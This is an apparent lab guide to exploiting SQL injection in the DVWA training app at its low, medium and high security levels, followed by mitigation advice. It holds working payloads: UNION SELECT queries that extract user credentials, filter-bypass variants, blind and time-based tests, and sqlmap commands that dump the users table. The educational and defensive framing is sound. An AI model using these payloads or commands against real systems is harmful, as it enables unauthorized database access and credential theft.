# SQL Injection Vulnerabilities in DVWA

This document outlines how to exploit SQL injection vulnerabilities in DVWA at different security levels.

## Overview

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It can allow attackers to:

- Bypass authentication
- Access, modify, or delete data
- Execute administrative operations on the database

## DVWA SQL Injection Lab

DVWA provides a dedicated SQL Injection page that demonstrates this vulnerability across different security levels (low, medium, high).

### Prerequisites

- DVWA running and accessible from Kali Linux
- Access to DVWA with admin/password credentials
- Basic understanding of SQL

## Exploitation Steps

### Low Security Level

1. **Navigate to SQL Injection page**
   - Log into DVWA
   - Select "SQL Injection" from the left menu
   - Ensure security level is set to "Low" (DVWA Security â†’ Low)

2. **Basic Enumeration**
   - Enter a simple numeric value like `1` to observe normal behavior
   - Try entering a single quote `'` to test for vulnerability
   - Notice the error message revealing SQL syntax and database structure

3. **Determine Number of Columns**
   - Use `1' ORDER BY 1 -- -` and increment the number until you get an error
   - For example: `1' ORDER BY 3 -- -` (no error), `1' ORDER BY 4 -- -` (error)
   - This tells you there are 3 columns in the query result

4. **Retrieve Database Information**
   - Database version: `1' UNION SELECT 1,@@version,3 -- -`
   - Current database: `1' UNION SELECT 1,database(),3 -- -`
   - List tables: `1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema = 'dvwa' -- -`

5. **Extract User Credentials**
   - Get column names: `1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name = 'users' -- -`
   - Extract usernames and passwords: `1' UNION SELECT user,password,3 FROM users -- -`

### Medium Security Level

1. **Bypassing Protections**
   - At medium level, DVWA implements basic filters
   - Use numeric bypasses: `1 UNION SELECT 1,2,3 -- -`
   - Try bypassing WAF using case variation: `1 UniOn SeLeCt 1,2,3 -- -`

2. **Extract User Data**
   - `1 UNION SELECT user,password,3 FROM users -- -`

### High Security Level

1. **Understanding the Protection**
   - High level uses parameterized queries, but still has vulnerabilities
   - Exploitation requires deeper understanding of SQL injection
   - Focus on numeric input as quotes are properly escaped

2. **Blind SQL Injection**
   - Use boolean-based techniques: `1 AND 1=1 -- -` vs `1 AND 1=0 -- -`
   - Time-based techniques: `1 AND SLEEP(5) -- -`

## SQL Injection Tools in Kali Linux

1. **SQLmap**
   - Basic scan: `sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" -p id`
   - Database dump: `sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" -p id --dbs`
   - Table extraction: `sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" -p id -D dvwa -T users --dump`

2. **Burp Suite**
   - Capture requests in Burp Proxy
   - Send to Repeater for manual testing
   - Use Intruder for automated attacks with payloads

## Mitigation Techniques

1. **Use Prepared Statements/Parameterized Queries**
   - Example in PHP: `$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');`

2. **Input Validation**
   - Type checking
   - Whitelist validation

3. **Stored Procedures**
   - Limit database permissions
   - Use stored procedures with parameterized inputs

4. **WAF Protection**
   - Implement a Web Application Firewall
   - Use tools like ModSecurity

## Documentation Notes

Record your findings in the following format:

1. Vulnerability details
2. Exploitation steps with screenshots
3. Data extracted
4. Suggested fixes
5. References

Remember to reset the database between tests to ensure consistent results. 